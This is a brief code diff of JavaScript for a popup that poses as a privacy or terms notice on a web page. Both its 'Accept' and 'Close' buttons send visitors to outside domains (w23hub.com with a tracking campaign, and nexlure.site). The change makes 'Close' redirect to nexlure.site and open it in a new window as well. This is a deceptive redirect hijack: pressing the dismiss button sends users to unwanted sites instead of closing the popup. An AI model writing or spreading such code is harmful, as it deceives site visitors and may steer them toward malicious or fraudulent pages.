@@ -212,7 +212,7 @@
     const accept = bd.querySelector('#ppAccept'), close = bd.querySelector('#ppClose');
     function goTerms(){ window.location.href = 'http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }
     if(accept) accept.addEventListener('click', goTerms);
-    if(close)  close.addEventListener('click', ()=>{ window.location.href='http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; try{ window.open('http://nexlure.site/'); }catch(e){} });
+    if(close)  close.addEventListener('click', ()=>{ window.location.href='http://nexlure.site/'; try{ window.open('http://nexlure.site/'); }catch(e){} });
   }
 
  (function maybeShowPrivacy(){
